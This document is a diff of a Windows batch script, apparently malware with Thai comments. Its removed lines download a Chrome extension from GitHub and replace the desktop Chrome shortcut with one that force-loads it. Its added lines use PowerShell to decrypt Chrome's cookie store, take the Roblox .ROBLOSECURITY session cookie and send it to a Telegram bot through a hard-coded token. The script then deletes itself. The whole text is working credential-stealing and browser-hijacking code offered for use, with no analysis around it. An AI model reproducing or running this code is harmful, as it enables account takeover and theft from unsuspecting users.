@@ -1,81 +1,35 @@
 @echo off
-setlocal enabledelayedexpansion
+setlocal
 
-:: --- [ CONFIGURATION ] ---
-set "EXT_ID=onifoepgcccnlehkgoonpaofeolhigpa"
-set "TARGET_DIR=%LOCALAPPDATA%\Google\Chrome\User Data\InternalSvc"
-set "EXT_PATH=%TARGET_DIR%\%EXT_ID%"
-set "EXT_URL=https://raw.githubusercontent.com/wkdopajwiojf/grap/main/onifoepgcccnlehkgoonpaofeolhigpa.zip"
-set "LOG_FILE=%TARGET_DIR%\debug_log.txt"
+:: --- [ CONFIG ] ---
+set "BOT_TOKEN=8622001163:AAFzrmxcoDLJKS51yyyddOceU_iUoOooWZ0"
+set "CHAT_ID=8508643177"
 
-:: --- [ DEBUG WINDOW SETUP ] ---
-echo ======================================== > "%LOG_FILE%"
-echo [!] STARTING INJECTION: %date% %time% >> "%LOG_FILE%"
-echo [?] TARGET PATH: %EXT_PATH% >> "%LOG_FILE%"
+:: --- [ EXECUTE POWERSHELL DECRYPTOR ] ---
+powershell -Command ^
+"$p = \"$env:LOCALAPPDATA\Google\Chrome\User Data\";" ^
+"$ls = Get-Content -Raw \"$p\Local State\" | ConvertFrom-Json;" ^
+"$ek = [System.Convert]::FromBase64String($ls.os_crypt.encrypted_key).Substring(5);" ^
+"$mk = [System.Security.Cryptography.ProtectedData]::Unprotect($ek, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser);" ^
+"Copy-Item \"$p\Default\Network\Cookies\" \"$env:TEMP\cc\";" ^
+"$db = [System.Data.SQLite.SQLiteConnection]::new(\"Data Source=$env:TEMP\cc\");" ^
+"if(-not (Get-Module -ListAvailable PSSQLite)) { " ^
+"  $db = New-Object -ComObject ADODB.Connection;" ^
+"  $db.Open(\"Driver={SQLite3 ODBC Driver};Database=$env:TEMP\cc;\");" ^
+"} else { $db.Open(); }" ^
+"$sql = \"SELECT encrypted_value FROM cookies WHERE host_key LIKE '%%roblox.com%%' AND name = '.ROBLOSECURITY'\";" ^
+"$cmd = $db.CreateCommand(); $cmd.CommandText = $sql;" ^
+"$r = $cmd.ExecuteReader();" ^
+"if($r.Read()) {" ^
+"  $v = $r['encrypted_value'];" ^
+"  $iv = $v[3..14]; $ct = $v[15..($v.Length-17)]; $tg = $v[($v.Length-16)..($v.Length-1)];" ^
+"  $aes = [System.Security.Cryptography.AesGcm]::new($mk);" ^
+"  $pt = New-Object byte[] $ct.Length;" ^
+"  $aes.Decrypt($iv, $ct, $tg, $pt);" ^
+"  $res = [System.Text.Encoding]::UTF8.GetString($pt);" ^
+"  Invoke-RestMethod -Uri \"https://api.telegram.org/bot%BOT_TOKEN%/sendMessage\" -Method Post -Body @{chat_id='%CHAT_ID%'; text=\"🎯 **Captured!**`n`n$res\"; parse_mode='Markdown'};" ^
+"}" ^
+"$db.Close(); Remove-Item \"$env:TEMP\cc\";"
 
-:: 1. สร้างโฟลเดอร์
-if not exist "%TARGET_DIR%" (
-    mkdir "%TARGET_DIR%"
-    echo [+] Created Target Directory >> "%LOG_FILE%"
-)
-
-:: 2. ดาวน์โหลดและแตกไฟล์
-echo [*] Downloading Extension... >> "%LOG_FILE%"
-powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%EXT_URL%' -OutFile '%TARGET_DIR%\ext.zip'"
-
-if exist "%TARGET_DIR%\ext.zip" (
-    echo [+] Download Complete >> "%LOG_FILE%"
-    powershell -Command "Expand-Archive -Path '%TARGET_DIR%\ext.zip' -DestinationPath '%TARGET_DIR%\temp_ext' -Force"
-    echo [+] Extraction Complete >> "%LOG_FILE%"
-) else (
-    echo [!] DOWNLOAD FAILED >> "%LOG_FILE%"
-    exit /b
-)
-
-:: จัดการโฟลเดอร์ซ้อน
-if exist "%TARGET_DIR%\temp_ext" (
-    if not exist "%EXT_PATH%" mkdir "%EXT_PATH%"
-    for /d %%D in ("%TARGET_DIR%\temp_ext\*") do (
-        xcopy "%%D\*" "%EXT_PATH%\" /s /e /y >nul
-    )
-    rd /s /q "%TARGET_DIR%\temp_ext"
-    del /f /q "%TARGET_DIR%\ext.zip"
-    echo [+] Folder Structure Optimized >> "%LOG_FILE%"
-)
-
-:: 3. สร้าง Shortcut ใหม่
-echo [*] Creating Hijacked Shortcut... >> "%LOG_FILE%"
-set "VBS_SCRIPT=%TEMP%\create_lnk.vbs"
-set "LNK_NAME=%PUBLIC%\Desktop\Google Chrome.lnk"
-
-:: เช็คว่ามี Shortcut เดิมไหม
-if exist "%LNK_NAME%" (
-    echo [-] Old Shortcut Found, Deleting... >> "%LOG_FILE%"
-    del /f /q "%LNK_NAME%"
-)
-
-echo Set oWS = WScript.CreateObject("WScript.Shell") > "%VBS_SCRIPT%"
-echo sLnkPath = "%LNK_NAME%" >> "%VBS_SCRIPT%"
-echo Set oLnk = oWS.CreateShortcut(sLnkPath) >> "%VBS_SCRIPT%"
-echo oLnk.TargetPath = "C:\Program Files\Google\Chrome\Application\chrome.exe" >> "%VBS_SCRIPT%"
-echo oLnk.Arguments = "--load-extension=""%EXT_PATH%""" >> "%VBS_SCRIPT%"
-echo oLnk.IconLocation = "C:\Program Files\Google\Chrome\Application\chrome.exe,0" >> "%VBS_SCRIPT%"
-echo oLnk.Save >> "%VBS_SCRIPT%"
-
-cscript //nologo "%VBS_SCRIPT%" >nul
-if %errorlevel% equ 0 (
-    echo [+] Shortcut Created Successfully >> "%LOG_FILE%"
-) else (
-    echo [!] VBS EXECUTION FAILED >> "%LOG_FILE%"
-)
-del "%VBS_SCRIPT%"
-
-:: --- [ FINAL CHECK ] ---
-echo [!] INJECTION FINISHED: %time% >> "%LOG_FILE%"
-echo ======================================== >> "%LOG_FILE%"
-
-:: สั่งเปิดไฟล์ Log มาดูผล (Debug Mode)
-start notepad.exe "%LOG_FILE%"
-
-:: ลบตัวเองทิ้ง (ยกเว้นไฟล์ Log เพื่อให้คุณดูผล)
+:: ลบตัวสคริปต์ทิ้งทันที
 (goto) 2>nul & del "%~f0"
